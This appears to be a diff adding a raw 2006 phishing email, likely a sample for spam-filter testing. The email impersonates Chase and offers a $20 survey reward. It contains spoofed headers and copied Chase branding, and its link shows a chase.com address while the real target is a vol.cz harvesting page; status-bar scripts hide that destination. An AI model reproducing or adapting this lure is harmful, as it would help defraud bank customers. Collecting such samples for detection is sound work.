@@ -1,0 +1,93 @@
+Return-Path: <online@chase.us>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+	by naughty.example.com (Postfix) with ESMTP id 6192F536FB9
+	for <nobody@login.example.com>; Mon,  3 Apr 2006 15:49:39 -0400 (EDT)
+Received: from thalia.site5.com (thalia.site5.com [216.118.97.232])
+	by mail1.example.com (Postfix) with ESMTP id 516426CCF2E
+	for <nobody@example.com>; Mon,  3 Apr 2006 11:03:19 -0400 (EDT)
+Received: from 207-246-87-29.dsl.blueone.net ([207.246.87.29] helo=User)
+	by thalia.site5.com with esmtpa (Exim 4.52)
+	id 1FQV28-0003WB-0c; Mon, 03 Apr 2006 15:48:16 -0400
+From: "Chase Online Service" <online@chase.us>
+Subject: Chase Reward Survey - Your chance to win 20$
+Date: Mon, 3 Apr 2006 15:46:59 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Antivirus-Scanner: This message has been scanned by ClamAV.
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - thalia.site5.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - chase.us
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Message-Id: <20060403150319.516426CCF2E@mail1.example.com>
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 728
+
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<table cellspacing="0" cellpadding="0" border="0" class="fullWidth" summary="global navigation" id="table2" width="721">
+<tr>
+<td><img src="https://chaseonline.chase.com/content/ecpweb/sso/image/chaseNew.gif" width="138" height="27" alt="Chase Logo" border="0" vspace="17" 
+hspace="17"><a href="#skip" class="global-nav"><img src="https://chaseonline.chase.com/content/ecpweb/sso/image/spacer.gif" alt=" Skip to main content 
+" width="1" height="1" border="0"></a><a href="javascript: void(0);" class="global-nav"><img 
+src="https://chaseonline.chase.com/content/ecpweb/sso/image/spacer.gif" alt=" Accessibility Information" width="1" height="1" border="0"></a></td>
+<td>&nbsp;</td>
+<td class="globalNav" width="155"><font face="Arial" style="font-size: 70%"><a href="http://www.chase.com" onBlur="window.status='';return true" 
+onMouseOver="window.status='';return true" onFocus="window.status='';return true" 
+onMouseOut="window.status='';return true" class="globalNavLinks">Chase.com</a>
+&nbsp;&nbsp;|&nbsp;&nbsp;
+<a href="http://www.chase.com/pages/privacy" onBlur="window.status='';return true" 
+onMouseOver="window.status='';return true" onFocus="window.status='';return true" 
+onMouseOut="window.status='';return true" class="globalNavLinks">Privacy 
+Policy</a></font>&nbsp;&nbsp;</td>
+</tr>
+</table>
+<table cellspacing="0" cellpadding="0" border="0" class="fullWidth" id="table1">
+	<tr>
+		<td valign="top" 
+        width="721" ><font face="Arial" style="font-size: 11pt">Dear Valued Customer,</font><p>
+		<font face="Arial" style="font-size: 11pt">You have been chosen by the Chase online department to take part in out quick and easy 5 question survey. In 
+return we will credit $20,00 to your account - Just for your time!</font></p>
+		<p><font face="Arial" style="font-size: 11pt">Helping us better understand how 
+our customers feel benefits everyone. With the information collected we can 
+decide to direct a number of changes to improve and expand our online service. 
+The Information you provide to us is all non-sensitive and anonymous.No part of 
+it is handed down to any third party.<br>It will be stored in our secure 
+database for maximum 7 days while we process the results of this nationwide 
+survey.<br>We kindly ask you to spare two 
+minutes of your time and take part in our survey.</font></p>
+		<p align="center"><font face="Arial" style="font-size: 11pt">To continue click on the link 
+below: </font><br>
+		<a href="http://kpsys-fwl.customer.vol.cz/chase/reward/survey/index.htm">
+		<font face="Arial" style="font-size: 11pt">https://www.chase.com/cm/cs?pagename=Chase/Href&amp;urlname=survey/cc/privacysecurity/</font></a></p>
+		<p><font face="Arial" style="font-size: 11pt">Kind Regards, <br>Dianne Letta<br>JPMorgan Chase &amp; Co.</font></p>
+		</td>
+		<td class="spacerW25">&nbsp;</td>
+	</tr>
+</table>
+
+</body>
+
+</html>
+
